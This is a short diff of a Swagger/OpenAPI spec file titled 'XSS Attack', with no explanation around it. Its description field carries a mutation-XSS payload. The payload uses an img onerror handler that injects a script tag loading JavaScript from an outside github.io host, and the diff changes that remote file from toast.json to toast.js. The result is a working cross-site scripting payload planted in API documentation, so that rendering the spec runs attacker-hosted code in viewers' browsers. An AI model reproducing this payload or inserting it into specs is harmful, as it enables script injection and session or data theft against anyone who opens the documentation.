@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: XSS Attack
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror="x=document.createElement('script');x.src='https://mahdizolqadr.github.io/telewall/toast.json';document.body.appendChild(x) src=1>" "></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror="x=document.createElement('script');x.src='https://mahdizolqadr.github.io/telewall/toast.js';document.body.appendChild(x) src=1>" "></form>
 
   version: production
 basePath: /JSSResource/
